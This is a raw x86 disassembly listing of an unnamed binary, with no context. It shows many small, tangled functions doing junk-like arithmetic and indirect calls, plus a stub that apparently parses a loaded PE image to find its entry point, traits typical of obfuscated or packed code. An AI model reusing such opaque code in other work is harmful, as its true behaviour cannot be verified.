  4d07ad:	add    BYTE PTR [eax],al
  4d07af:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07b5:	sub    esp,0x30
  4d07b8:	mov    ebx,0x4d30d0
  4d07bd:	and    DWORD PTR [ebp-0x10],0xffffffbe
  4d07c1:	push   ebx
  4d07c2:	push   DWORD PTR [ebx+0x1a8]
  4d07c8:	push   edx
  4d07c9:	push   DWORD PTR [ebx+0x174]
  4d07cf:	call   0x4d1458
  4d07d4:	add    esp,0xc
  4d07d7:	pop    ebx
  4d07d8:	mov    ecx,0xfffffff4
  4d07dd:	push   ecx
  4d07de:	call   0x4d1544
  4d07e3:	add    esp,0x4
  4d07e6:	push   0x0
  4d07e8:	call   0x4d07a4
  4d07ed:	add    esp,0x4
  4d07f0:	add    esp,0x30
  4d07f3:	pop    ebp
  4d07f4:	ret    
  4d07f5:	add    BYTE PTR [eax],al
  4d07f7:	add    BYTE PTR [edi-0x1],bl
  4d07fa:	adc    eax,0x4d2074
  4d07ff:	call   edi
  4d0801:	add    BYTE PTR [eax],al
  4d0803:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0809:	sub    esp,0x28
  4d080c:	lea    ebx,ds:0x4d3128
  4d0812:	xor    esi,DWORD PTR [ebx+0x74]
  4d0815:	mov    edx,0x0
  4d081a:	push   edx
  4d081b:	call   0x4d1308
  4d0820:	add    esp,0x4
  4d0823:	push   ebx
  4d0824:	push   eax
  4d0825:	push   edx
  4d0826:	push   DWORD PTR [ebx+0x34]
  4d0829:	call   0x4d0dac
  4d082e:	add    esp,0xc
  4d0831:	pop    ebx
  4d0832:	call   0x4d1010
  4d0837:	add    esp,0x4
  4d083a:	add    esp,0x28
  4d083d:	pop    ebp
  4d083e:	ret    
  4d083f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0845:	sub    esp,0x48
  4d0848:	lea    edi,[esi+0x7c]
  4d084b:	or     ecx,edi
  4d084d:	push   edi
  4d084e:	push   eax
  4d084f:	push   DWORD PTR [edi+0x1cc]
  4d0855:	push   ebx
  4d0856:	call   0x4d08e4
  4d085b:	add    esp,0xc
  4d085e:	pop    edi
  4d085f:	push   edi
  4d0860:	push   0x0
  4d0862:	call   0x4d12ac
  4d0867:	add    esp,0x4
  4d086a:	pop    edi
  4d086b:	push   edi
  4d086c:	push   0x0
  4d086e:	call   0x4d1594
  4d0873:	add    esp,0x4
  4d0876:	pop    edi
  4d0877:	add    esp,0x48
  4d087a:	pop    ebp
  4d087b:	ret    
  4d087c:	pop    edi
  4d087d:	call   DWORD PTR ds:0x4d200c
  4d0883:	call   edi
  4d0885:	add    BYTE PTR [eax],al
  4d0887:	add    BYTE PTR [edi-0x1],bl
  4d088a:	adc    eax,0x4d2000
  4d088f:	call   edi
  4d0891:	add    BYTE PTR [eax],al
  4d0893:	add    BYTE PTR [edi-0x1],bl
  4d0896:	adc    eax,0x4d2058
  4d089b:	call   edi
  4d089d:	add    BYTE PTR [eax],al
  4d089f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08a5:	sub    esp,0x40
  4d08a8:	lea    edi,ds:0x4d30e0
  4d08ae:	adc    DWORD PTR [ebp-0x30],edi
  4d08b1:	push   edi
  4d08b2:	push   0x0
  4d08b4:	call   0x4d087c
  4d08b9:	add    esp,0x4
  4d08bc:	pop    edi
  4d08bd:	push   edi
  4d08be:	push   eax
  4d08bf:	push   DWORD PTR [edi+0x3c]
  4d08c2:	push   eax
  4d08c3:	push   DWORD PTR [edi+0x6c]
  4d08c6:	call   0x4d0a8c
  4d08cb:	add    esp,0x10
  4d08ce:	pop    edi
  4d08cf:	push   edi
  4d08d0:	mov    ecx,0x0
  4d08d5:	push   ecx
  4d08d6:	call   0x4d0a74
  4d08db:	add    esp,0x4
  4d08de:	pop    edi
  4d08df:	add    esp,0x40
  4d08e2:	pop    ebp
  4d08e3:	ret    
  4d08e4:	mov    edi,edi
  4d08e6:	push   ebp
  4d08e7:	mov    ebp,esp
  4d08e9:	sub    esp,0x30
  4d08ec:	mov    ecx,0x4d311c
  4d08f1:	adc    edi,DWORD PTR [ebp-0x2c]
  4d08f4:	push   ecx
  4d08f5:	push   0x0
  4d08f7:	call   0x4d087c
  4d08fc:	add    esp,0x4
  4d08ff:	pop    ecx
  4d0900:	push   ecx
  4d0901:	push   DWORD PTR [ecx+0x90]
  4d0907:	push   DWORD PTR [ecx+0xe8]
  4d090d:	push   DWORD PTR [ecx]
  4d090f:	push   DWORD PTR [ecx+0xcc]
  4d0915:	call   0x4d1550
  4d091a:	add    esp,0x10
  4d091d:	pop    ecx
  4d091e:	push   ecx
  4d091f:	call   0x4d14fc
  4d0924:	add    esp,0x4
  4d0927:	pop    ecx
  4d0928:	add    esp,0x30
  4d092b:	pop    ebp
  4d092c:	ret    
  4d092d:	add    BYTE PTR [eax],al
  4d092f:	add    BYTE PTR [edi-0x1],bl
  4d0932:	adc    eax,0x4d203c
  4d0937:	call   edi
  4d0939:	add    BYTE PTR [eax],al
  4d093b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0941:	sub    esp,0x54
  4d0944:	lea    ecx,ds:0x4d3130
  4d094a:	sbb    edx,DWORD PTR [ebp-0x28]
  4d094d:	push   ecx
  4d094e:	push   0x0
  4d0950:	call   0x4d07a4
  4d0955:	add    esp,0x4
  4d0958:	pop    ecx
  4d0959:	push   ecx
  4d095a:	push   DWORD PTR [ecx+0xd0]
  4d0960:	push   ebx
  4d0961:	push   edi
  4d0962:	call   0x4d1254
  4d0967:	add    esp,0xc
  4d096a:	pop    ecx
  4d096b:	push   ecx
  4d096c:	mov    ecx,0x0
  4d0971:	push   ecx
  4d0972:	call   0x4d073c
  4d0977:	add    esp,0x4
  4d097a:	pop    ecx
  4d097b:	add    esp,0x54
  4d097e:	pop    ebp
  4d097f:	ret    
  4d0980:	mov    edi,edi
  4d0982:	push   ebp
  4d0983:	mov    ebp,esp
  4d0985:	sub    esp,0x24
  4d0988:	lea    edx,ds:0x4d30ec
  4d098e:	sbb    DWORD PTR [ebp-0xc],ebx
  4d0991:	push   edx
  4d0992:	call   0x4d14fc
  4d0997:	add    esp,0x4
  4d099a:	pop    edx
  4d099b:	push   edx
  4d099c:	push   DWORD PTR [edx+0xe0]
  4d09a2:	push   DWORD PTR [edx+0x120]
  4d09a8:	push   DWORD PTR [edx+0x140]
  4d09ae:	call   0x4d0c58
  4d09b3:	add    esp,0xc
  4d09b6:	pop    edx
  4d09b7:	push   edx
  4d09b8:	push   0x0
  4d09ba:	call   0x4d115c
  4d09bf:	add    esp,0x4
  4d09c2:	pop    edx
  4d09c3:	add    esp,0x24
  4d09c6:	pop    ebp
  4d09c7:	ret    
  4d09c8:	mov    edi,edi
  4d09ca:	push   ebp
  4d09cb:	mov    ebp,esp
  4d09cd:	sub    esp,0x38
  4d09d0:	lea    esi,[ecx+0xac]
  4d09d6:	xor    DWORD PTR [esi-0x94],0xffffa1ce
  4d09e0:	mov    ebx,0x0
  4d09e5:	push   ebx
  4d09e6:	call   0x4d1308
  4d09eb:	add    esp,0x4
  4d09ee:	push   esi
  4d09ef:	push   DWORD PTR [esi+0x7c]
  4d09f2:	push   ecx
  4d09f3:	push   edi
  4d09f4:	call   0x4d0f60
  4d09f9:	add    esp,0xc
  4d09fc:	pop    esi
  4d09fd:	call   0x4d1010
  4d0a02:	add    esp,0x4
  4d0a05:	add    esp,0x38
  4d0a08:	pop    ebp
  4d0a09:	ret    
  4d0a0a:	add    BYTE PTR [eax],al
  4d0a0c:	pop    edi
  4d0a0d:	call   DWORD PTR ds:0x4d2098
  4d0a13:	call   edi
  4d0a15:	add    BYTE PTR [eax],al
  4d0a17:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a1d:	sub    esp,0x4c
  4d0a20:	lea    edi,[eax-0x150]
  4d0a26:	add    DWORD PTR [edi+0x15c],0xffffa697
  4d0a30:	push   edi
  4d0a31:	push   DWORD PTR [edi+0xe4]
  4d0a37:	push   eax
  4d0a38:	push   eax
  4d0a39:	push   ecx
  4d0a3a:	call   0x4d1078
  4d0a3f:	add    esp,0x10
  4d0a42:	pop    edi
  4d0a43:	push   edi
  4d0a44:	mov    edx,0x0
  4d0a49:	push   edx
  4d0a4a:	call   0x4d0a74
  4d0a4f:	add    esp,0x4
  4d0a52:	pop    edi
  4d0a53:	push   edi
  4d0a54:	mov    edi,0x0
  4d0a59:	push   edi
  4d0a5a:	call   0x4d073c
  4d0a5f:	add    esp,0x4
  4d0a62:	pop    edi
  4d0a63:	add    esp,0x4c
  4d0a66:	pop    ebp
  4d0a67:	ret    
  4d0a68:	pop    edi
  4d0a69:	call   DWORD PTR ds:0x4d2090
  4d0a6f:	call   edi
  4d0a71:	add    BYTE PTR [eax],al
  4d0a73:	add    BYTE PTR [edi-0x1],bl
  4d0a76:	adc    eax,0x4d2020
  4d0a7b:	call   edi
  4d0a7d:	add    BYTE PTR [eax],al
  4d0a7f:	add    BYTE PTR [edi-0x1],bl
  4d0a82:	adc    eax,0x4d201c
  4d0a87:	call   edi
  4d0a89:	add    BYTE PTR [eax],al
  4d0a8b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a91:	sub    esp,0x44
  4d0a94:	lea    eax,ds:0x4d3174
  4d0a9a:	xor    DWORD PTR [ebp-0x28],edx
  4d0a9d:	push   eax
  4d0a9e:	lea    ebx,[eax-0x174]
  4d0aa4:	push   ebx
  4d0aa5:	call   0x4d11ac
  4d0aaa:	add    esp,0x4
  4d0aad:	test   eax,eax
  4d0aaf:	jne    0x4d0a9e
  4d0ab1:	pop    eax
  4d0ab2:	push   eax
  4d0ab3:	push   edx
  4d0ab4:	push   DWORD PTR [eax+0x108]
  4d0aba:	push   DWORD PTR [eax+0x10]
  4d0abd:	call   0x4d0a18
  4d0ac2:	add    esp,0xc
  4d0ac5:	pop    eax
  4d0ac6:	push   eax
  4d0ac7:	mov    eax,0x0
  4d0acc:	push   eax
  4d0acd:	call   0x4d1594
  4d0ad2:	add    esp,0x4
  4d0ad5:	pop    eax
  4d0ad6:	add    esp,0x44
  4d0ad9:	pop    ebp
  4d0ada:	ret    
  4d0adb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ae1:	sub    esp,0x30
  4d0ae4:	lea    ecx,[ebx-0xa4]
  4d0aea:	xor    DWORD PTR [ebp-0x30],edx
  4d0aed:	push   ecx
  4d0aee:	call   0x4d1294
  4d0af3:	add    esp,0x4
  4d0af6:	pop    ecx
  4d0af7:	push   ecx
  4d0af8:	push   DWORD PTR [ecx+0xec]
  4d0afe:	push   DWORD PTR [ecx+0x158]
  4d0b04:	push   edx
  4d0b05:	push   DWORD PTR [ecx+0xf0]
  4d0b0b:	call   0x4d0e08
  4d0b10:	add    esp,0x10
  4d0b13:	pop    ecx
  4d0b14:	push   ecx
  4d0b15:	push   0x0
  4d0b17:	call   0x4d073c
  4d0b1c:	add    esp,0x4
  4d0b1f:	pop    ecx
  4d0b20:	add    esp,0x30
  4d0b23:	pop    ebp
  4d0b24:	ret    
  4d0b25:	add    BYTE PTR [eax],al
  4d0b27:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b2d:	sub    esp,0x38
  4d0b30:	lea    ebx,[eax-0x24]
  4d0b33:	adc    DWORD PTR [ebx-0xb4],edx
  4d0b39:	mov    eax,0x0
  4d0b3e:	push   eax
  4d0b3f:	call   0x4d07a4
  4d0b44:	add    esp,0x4
  4d0b47:	push   ebx
  4d0b48:	push   DWORD PTR [ebx+0x15c]
  4d0b4e:	push   edx
  4d0b4f:	push   edx
  4d0b50:	push   esi
  4d0b51:	call   0x4d1358
  4d0b56:	add    esp,0x10
  4d0b59:	pop    ebx
  4d0b5a:	lea    edx,[ebx-0x1d8]
  4d0b60:	push   edx
  4d0b61:	call   0x4d11ac
  4d0b66:	add    esp,0x4
  4d0b69:	test   eax,eax
  4d0b6b:	jne    0x4d0b5b
  4d0b6d:	add    esp,0x38
  4d0b70:	pop    ebp
  4d0b71:	ret    
  4d0b72:	add    BYTE PTR [eax],al
  4d0b74:	mov    edi,edi
  4d0b76:	push   ebp
  4d0b77:	mov    ebp,esp
  4d0b79:	sub    esp,0x60
  4d0b7c:	lea    ebx,ds:0x4d3094
  4d0b82:	sbb    DWORD PTR [ebx-0x78],0xffffc13c
  4d0b89:	mov    esi,0x0
  4d0b8e:	push   esi
  4d0b8f:	call   0x4d1594
  4d0b94:	add    esp,0x4
  4d0b97:	push   ebx
  4d0b98:	push   DWORD PTR [ebx+0x194]
  4d0b9e:	push   DWORD PTR [ebx+0x19c]
  4d0ba4:	push   DWORD PTR [ebx+0xb4]
  4d0baa:	push   DWORD PTR [ebx+0x60]
  4d0bad:	call   0x4d1508
  4d0bb2:	add    esp,0x10
  4d0bb5:	pop    ebx
  4d0bb6:	mov    esi,0x0
  4d0bbb:	push   esi
  4d0bbc:	call   0x4d12ac
  4d0bc1:	add    esp,0x4
  4d0bc4:	add    esp,0x60
  4d0bc7:	pop    ebp
  4d0bc8:	ret    
  4d0bc9:	add    BYTE PTR [eax],al
  4d0bcb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bd1:	sub    esp,0x34
  4d0bd4:	mov    esi,0x4d315c
  4d0bd9:	sub    edi,DWORD PTR [esi-0x30]
  4d0bdc:	mov    ebx,0x0
  4d0be1:	push   ebx
  4d0be2:	call   0x4d115c
  4d0be7:	add    esp,0x4
  4d0bea:	push   esi
  4d0beb:	push   DWORD PTR [esi+0x1d4]
  4d0bf1:	push   edi
  4d0bf2:	push   DWORD PTR [esi]
  4d0bf4:	push   DWORD PTR [esi+0x30]
  4d0bf7:	call   0x4d0840
  4d0bfc:	add    esp,0x10
  4d0bff:	pop    esi
  4d0c00:	push   0x0
  4d0c02:	call   0x4d12ac
  4d0c07:	add    esp,0x4
  4d0c0a:	add    esp,0x34
  4d0c0d:	pop    ebp
  4d0c0e:	ret    
  4d0c0f:	add    BYTE PTR [edi+0x2b],dl
  4d0c12:	call   DWORD PTR [edi+0x57]
  4d0c15:	push   edi
  4d0c16:	push   edi
  4d0c17:	call   0x4d1294
  4d0c1c:	sub    esp,0xfffffffc
  4d0c1f:	call   0x4d06ec
  4d0c24:	push   0x2
  4d0c26:	xor    eax,eax
  4d0c28:	dec    eax
  4d0c29:	and    eax,0x4d3030
  4d0c2e:	push   0x0
  4d0c30:	lea    ecx,[eax+0x6]
  4d0c33:	add    BYTE PTR [ecx],0x41
  4d0c36:	push   eax
  4d0c37:	call   0x4d144c
  4d0c3c:	pop    edi
  4d0c3d:	pop    edi
  4d0c3e:	pop    edi
  4d0c3f:	lea    edi,[eax+0x3b]
  4d0c42:	mov    edi,DWORD PTR [edi]
  4d0c44:	lea    eax,[eax+edi*1]
  4d0c47:	mov    eax,DWORD PTR [eax+0x28]
  4d0c4a:	pusha  
  4d0c4b:	mov    ah,0x45
  4d0c4d:	sub    al,ah
  4d0c4f:	ja     0x4d0748
  4d0c55:	popa   
  4d0c56:	ret    
  4d0c57:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c5d:	sub    esp,0x48
  4d0c60:	lea    eax,ds:0x4d3114
  4d0c66:	and    esi,ecx
  4d0c68:	push   eax
  4d0c69:	push   edi
  4d0c6a:	push   DWORD PTR [eax+0x1cc]
  4d0c70:	call   0x4d11b8
  4d0c75:	add    esp,0x8
  4d0c78:	pop    eax
  4d0c79:	push   eax
  4d0c7a:	lea    eax,[eax-0x114]
  4d0c80:	push   eax
  4d0c81:	call   0x4d11ac
  4d0c86:	add    esp,0x4
  4d0c89:	test   eax,eax
  4d0c8b:	jne    0x4d0c7a
  4d0c8d:	pop    eax
  4d0c8e:	push   eax
  4d0c8f:	call   0x4d1010
  4d0c94:	add    esp,0x4
  4d0c97:	pop    eax
  4d0c98:	add    esp,0x48
  4d0c9b:	pop    ebp
  4d0c9c:	ret    
  4d0c9d:	add    BYTE PTR [eax],al
  4d0c9f:	add    BYTE PTR [edi-0x1],bl
  4d0ca2:	adc    eax,0x4d2094
  4d0ca7:	call   edi
  4d0ca9:	add    BYTE PTR [eax],al
  4d0cab:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0cb1:	sub    esp,0x2c
  4d0cb4:	mov    ecx,0x4d3054
  4d0cb9:	sub    edi,DWORD PTR [ecx+0xc]
  4d0cbc:	push   ecx
  4d0cbd:	push   DWORD PTR [ecx+0x4]
  4d0cc0:	push   edx
  4d0cc1:	push   ebx
  4d0cc2:	call   0x4d0e94
  4d0cc7:	add    esp,0xc
  4d0cca:	pop    ecx
  4d0ccb:	push   ecx
  4d0ccc:	push   0x0
  4d0cce:	call   0x4d12ac
  4d0cd3:	add    esp,0x4
  4d0cd6:	pop    ecx
  4d0cd7:	push   ecx
  4d0cd8:	push   0x0
  4d0cda:	call   0x4d12ac
  4d0cdf:	add    esp,0x4
  4d0ce2:	pop    ecx
  4d0ce3:	add    esp,0x2c
  4d0ce6:	pop    ebp
  4d0ce7:	ret    
  4d0ce8:	mov    edi,edi
  4d0cea:	push   ebp
  4d0ceb:	mov    ebp,esp
  4d0ced:	sub    esp,0x20
  4d0cf0:	lea    ebx,ds:0x4d300c
  4d0cf6:	or     DWORD PTR [ebx+0x4],0xffffffa6
  4d0cfa:	push   0x0
  4d0cfc:	call   0x4d115c
  4d0d01:	add    esp,0x4
  4d0d04:	push   ebx
  4d0d05:	push   DWORD PTR [ebx+0x7c]
  4d0d08:	push   ecx
  4d0d09:	push   edx
  4d0d0a:	push   DWORD PTR [ebx+0x144]
  4d0d10:	call   0x4d0d64
  4d0d15:	add    esp,0x10
  4d0d18:	pop    ebx
  4d0d19:	push   0x0
  4d0d1b:	call   0x4d115c
  4d0d20:	add    esp,0x4
  4d0d23:	add    esp,0x20
  4d0d26:	pop    ebp
  4d0d27:	ret    
  4d0d28:	mov    edi,edi
  4d0d2a:	push   ebp
  4d0d2b:	mov    ebp,esp
  4d0d2d:	sub    esp,0x34
  4d0d30:	lea    esi,[edi+0x50]
  4d0d33:	sub    eax,ecx
  4d0d35:	push   esi
  4d0d36:	push   DWORD PTR [esi+0x5c]
  4d0d39:	push   DWORD PTR [esi+0x98]
  4d0d3f:	call   0x4d1114
  4d0d44:	add    esp,0x8
  4d0d47:	pop    esi
  4d0d48:	call   0x4d1294
  4d0d4d:	add    esp,0x4
  4d0d50:	mov    ecx,0x0
  4d0d55:	push   ecx
  4d0d56:	call   0x4d1308
  4d0d5b:	add    esp,0x4
  4d0d5e:	add    esp,0x34
  4d0d61:	pop    ebp
  4d0d62:	ret    
  4d0d63:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d69:	sub    esp,0x58
  4d0d6c:	lea    ecx,ds:0x4d30d4
  4d0d72:	and    eax,esi
  4d0d74:	push   ecx
  4d0d75:	mov    ecx,0x0
  4d0d7a:	push   ecx
  4d0d7b:	call   0x4d0888
  4d0d80:	add    esp,0x4
  4d0d83:	pop    ecx
  4d0d84:	push   ecx
  4d0d85:	push   DWORD PTR [ecx+0x44]
  4d0d88:	push   edi
  4d0d89:	push   DWORD PTR [ecx+0xa8]
  4d0d8f:	push   DWORD PTR [ecx+0x30]
  4d0d92:	call   0x4d09c8
  4d0d97:	add    esp,0x10
  4d0d9a:	pop    ecx
  4d0d9b:	push   ecx
  4d0d9c:	call   0x4d1010
  4d0da1:	add    esp,0x4
  4d0da4:	pop    ecx
  4d0da5:	add    esp,0x58
  4d0da8:	pop    ebp
  4d0da9:	ret    
  4d0daa:	add    BYTE PTR [eax],al
  4d0dac:	mov    edi,edi
  4d0dae:	push   ebp
  4d0daf:	mov    ebp,esp
  4d0db1:	sub    esp,0x4c
  4d0db4:	lea    edx,ds:0x4d313c
  4d0dba:	adc    edi,0x926
  4d0dc0:	push   edx
  4d0dc1:	push   esi
  4d0dc2:	push   DWORD PTR [edx+0x1d0]
  4d0dc8:	push   DWORD PTR [edx+0x194]
  4d0dce:	push   edi
  4d0dcf:	call   0x4d0b74
  4d0dd4:	add    esp,0x10
  4d0dd7:	pop    edx
  4d0dd8:	push   edx
  4d0dd9:	push   0x0
  4d0ddb:	call   0x4d1308
  4d0de0:	add    esp,0x4
  4d0de3:	pop    edx
  4d0de4:	push   edx
  4d0de5:	mov    eax,0x0
  4d0dea:	push   eax
  4d0deb:	call   0x4d1308
  4d0df0:	add    esp,0x4
  4d0df3:	pop    edx
  4d0df4:	add    esp,0x4c
  4d0df7:	pop    ebp
  4d0df8:	ret    
  4d0df9:	add    BYTE PTR [eax],al
  4d0dfb:	add    BYTE PTR [edi-0x1],bl
  4d0dfe:	adc    eax,0x4d2028
  4d0e03:	call   edi
  4d0e05:	add    BYTE PTR [eax],al
  4d0e07:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e0d:	sub    esp,0x48
  4d0e10:	lea    edx,ds:0x4d3148
  4d0e16:	mov    eax,DWORD PTR [edx+0x20]
  4d0e19:	push   edx
  4d0e1a:	call   0x4d1010
  4d0e1f:	add    esp,0x4
  4d0e22:	pop    edx
  4d0e23:	push   edx
  4d0e24:	push   DWORD PTR [edx+0x110]
  4d0e2a:	push   DWORD PTR [edx+0x10]
  4d0e2d:	push   esi
  4d0e2e:	call   0x4d0f10
  4d0e33:	add    esp,0xc
  4d0e36:	pop    edx
  4d0e37:	push   edx
  4d0e38:	mov    esi,0x0
  4d0e3d:	push   esi
  4d0e3e:	call   0x4d087c
  4d0e43:	add    esp,0x4
  4d0e46:	pop    edx
  4d0e47:	add    esp,0x48
  4d0e4a:	pop    ebp
  4d0e4b:	ret    
  4d0e4c:	mov    edi,edi
  4d0e4e:	push   ebp
  4d0e4f:	mov    ebp,esp
  4d0e51:	sub    esp,0x2c
  4d0e54:	lea    edi,[esi-0x10]
  4d0e57:	mov    DWORD PTR [edi+0x64],0x76e5
  4d0e5e:	push   edi
  4d0e5f:	push   DWORD PTR [edi+0x178]
  4d0e65:	push   esi
  4d0e66:	push   ecx
  4d0e67:	push   DWORD PTR [edi+0x150]
  4d0e6d:	call   0x4d101c
  4d0e72:	add    esp,0x10
  4d0e75:	pop    edi
  4d0e76:	push   edi
  4d0e77:	push   0x0
  4d0e79:	call   0x4d087c
  4d0e7e:	add    esp,0x4
  4d0e81:	pop    edi
  4d0e82:	push   edi
  4d0e83:	push   0x0
  4d0e85:	call   0x4d0f54
  4d0e8a:	add    esp,0x4
  4d0e8d:	pop    edi
  4d0e8e:	add    esp,0x2c
  4d0e91:	pop    ebp
  4d0e92:	ret    
  4d0e93:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e99:	sub    esp,0x28
  4d0e9c:	mov    esi,0x4d3098
  4d0ea1:	cmp    esi,0x817
  4d0ea7:	je     0x4d0e97
  4d0ea9:	mov    eax,0x0
  4d0eae:	push   eax
  4d0eaf:	call   0x4d1308
  4d0eb4:	add    esp,0x4
  4d0eb7:	push   esi
  4d0eb8:	push   eax
  4d0eb9:	push   ecx
  4d0eba:	push   ebx
  4d0ebb:	call   0x4d0e4c
  4d0ec0:	add    esp,0xc
  4d0ec3:	pop    esi
  4d0ec4:	mov    edi,0x0
  4d0ec9:	push   edi
  4d0eca:	call   0x4d07a4
  4d0ecf:	add    esp,0x4
  4d0ed2:	add    esp,0x28
  4d0ed5:	pop    ebp
  4d0ed6:	ret    
  4d0ed7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0edd:	sub    esp,0x28
  4d0ee0:	lea    edi,[ebx+0x90]
  4d0ee6:	or     eax,ecx
  4d0ee8:	push   edi
  4d0ee9:	push   ecx
  4d0eea:	push   eax
  4d0eeb:	push   ebx
  4d0eec:	call   0x4d0d28
  4d0ef1:	add    esp,0xc
  4d0ef4:	pop    edi
  4d0ef5:	push   edi
  4d0ef6:	push   0xfffffff4
  4d0ef8:	call   0x4d1544
  4d0efd:	add    esp,0x4
  4d0f00:	pop    edi
  4d0f01:	push   edi
  4d0f02:	call   0x4d1010
  4d0f07:	add    esp,0x4
  4d0f0a:	pop    edi
  4d0f0b:	add    esp,0x28
  4d0f0e:	pop    ebp
  4d0f0f:	ret    
  4d0f10:	mov    edi,edi
  4d0f12:	push   ebp
  4d0f13:	mov    ebp,esp
  4d0f15:	sub    esp,0x50
  4d0f18:	lea    eax,ds:0x4d31fc
  4d0f1e:	and    DWORD PTR [eax-0x28],0xe
  4d0f22:	push   eax
  4d0f23:	push   0x0
  4d0f25:	call   0x4d073c
  4d0f2a:	add    esp,0x4
  4d0f2d:	pop    eax
  4d0f2e:	push   eax
  4d0f2f:	push   esi
  4d0f30:	push   DWORD PTR [eax+0xb0]
  4d0f36:	push   edx
  4d0f37:	call   0x4d0b28
  4d0f3c:	add    esp,0xc
  4d0f3f:	pop    eax
  4d0f40:	push   eax
  4d0f41:	push   0x0
  4d0f43:	call   0x4d087c
  4d0f48:	add    esp,0x4
  4d0f4b:	pop    eax
  4d0f4c:	add    esp,0x50
  4d0f4f:	pop    ebp
  4d0f50:	ret    
  4d0f51:	add    BYTE PTR [eax],al
  4d0f53:	add    BYTE PTR [edi-0x1],bl
  4d0f56:	adc    eax,0x4d2014
  4d0f5b:	call   edi
  4d0f5d:	add    BYTE PTR [eax],al
  4d0f5f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f65:	sub    esp,0x20
  4d0f68:	lea    edi,ds:0x4d3008
  4d0f6e:	and    DWORD PTR [edi+0x7c],ecx
  4d0f71:	push   edi
  4d0f72:	mov    edx,0x0
  4d0f77:	push   edx
  4d0f78:	call   0x4d12ac
  4d0f7d:	add    esp,0x4
  4d0f80:	pop    edi
  4d0f81:	push   edi
  4d0f82:	push   DWORD PTR [edi+0x130]
  4d0f88:	push   DWORD PTR [edi+0x7c]
  4d0f8b:	call   0x4d120c
  4d0f90:	add    esp,0x8
  4d0f93:	pop    edi
  4d0f94:	push   edi
  4d0f95:	mov    edi,0x0
  4d0f9a:	push   edi
  4d0f9b:	call   0x4d115c
  4d0fa0:	add    esp,0x4
  4d0fa3:	pop    edi
  4d0fa4:	add    esp,0x20
  4d0fa7:	pop    ebp
  4d0fa8:	ret    
  4d0fa9:	add    BYTE PTR [eax],al
  4d0fab:	add    BYTE PTR [edi-0x1],bl
  4d0fae:	adc    eax,0x4d207c
  4d0fb3:	call   edi
  4d0fb5:	add    BYTE PTR [eax],al
  4d0fb7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fbd:	sub    esp,0x58
  4d0fc0:	mov    eax,0x4d30c8
  4d0fc5:	sbb    DWORD PTR [eax+0x60],0xffffff9e
  4d0fc9:	push   eax
  4d0fca:	push   esi
  4d0fcb:	push   esi
  4d0fcc:	call   0x4d0980
  4d0fd1:	add    esp,0x8
  4d0fd4:	pop    eax
  4d0fd5:	push   eax
  4d0fd6:	mov    edx,0x0
  4d0fdb:	push   edx
  4d0fdc:	call   0x4d087c
  4d0fe1:	add    esp,0x4
  4d0fe4:	pop    eax
  4d0fe5:	push   eax
  4d0fe6:	push   0x0
  4d0fe8:	call   0x4d07a4
  4d0fed:	add    esp,0x4
  4d0ff0:	pop    eax
  4d0ff1:	add    esp,0x58
  4d0ff4:	pop    ebp
  4d0ff5:	ret    
  4d0ff6:	add    BYTE PTR [eax],al
  4d0ff8:	pop    edi
  4d0ff9:	call   DWORD PTR ds:0x4d2080
  4d0fff:	call   edi
  4d1001:	add    BYTE PTR [eax],al
  4d1003:	add    BYTE PTR [edi-0x1],bl
  4d1006:	adc    eax,0x4d208c
  4d100b:	call   edi
  4d100d:	add    BYTE PTR [eax],al
  4d100f:	add    BYTE PTR [edi-0x1],bl
  4d1012:	adc    eax,0x4d2010
  4d1017:	call   edi
  4d1019:	add    BYTE PTR [eax],al
  4d101b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1021:	sub    esp,0x34
  4d1024:	mov    eax,0x4d31ec
  4d1029:	xor    DWORD PTR [ebp-0x10],edx
  4d102c:	push   eax
  4d102d:	push   0x0
  4d102f:	call   0x4d12ac
  4d1034:	add    esp,0x4
  4d1037:	pop    eax
  4d1038:	push   eax
  4d1039:	push   DWORD PTR [eax+0xd8]
  4d103f:	push   DWORD PTR [eax+0x1a8]
  4d1045:	push   DWORD PTR [eax+0xa8]
  4d104b:	push   DWORD PTR [eax+0x15c]
  4d1051:	call   0x4d0bcc
  4d1056:	add    esp,0x10
  4d1059:	pop    eax
  4d105a:	push   eax
  4d105b:	call   0x4d1294
  4d1060:	add    esp,0x4
  4d1063:	pop    eax
  4d1064:	add    esp,0x34
  4d1067:	pop    ebp
  4d1068:	ret    
  4d1069:	add    BYTE PTR [eax],al
  4d106b:	add    BYTE PTR [edi-0x1],bl
  4d106e:	adc    eax,0x4d20a0
  4d1073:	call   edi
  4d1075:	add    BYTE PTR [eax],al
  4d1077:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d107d:	sub    esp,0x54
  4d1080:	lea    ecx,[edi+0x18]
  4d1083:	xor    eax,DWORD PTR [ebp-0x10]
  4d1086:	push   ecx
  4d1087:	push   eax
  4d1088:	push   DWORD PTR [ecx+0x1ac]
  4d108e:	push   ebx
  4d108f:	push   DWORD PTR [ecx+0xe8]
  4d1095:	call   0x4d13f4
  4d109a:	add    esp,0x10
  4d109d:	pop    ecx
  4d109e:	push   ecx
  4d109f:	push   0x0
  4d10a1:	call   0x4d087c
  4d10a6:	add    esp,0x4
  4d10a9:	pop    ecx
  4d10aa:	push   ecx
  4d10ab:	mov    ebx,0x0
  4d10b0:	push   ebx
  4d10b1:	call   0x4d07a4
  4d10b6:	add    esp,0x4
  4d10b9:	pop    ecx
  4d10ba:	add    esp,0x54
  4d10bd:	pop    ebp
  4d10be:	ret    
  4d10bf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10c5:	sub    esp,0x40
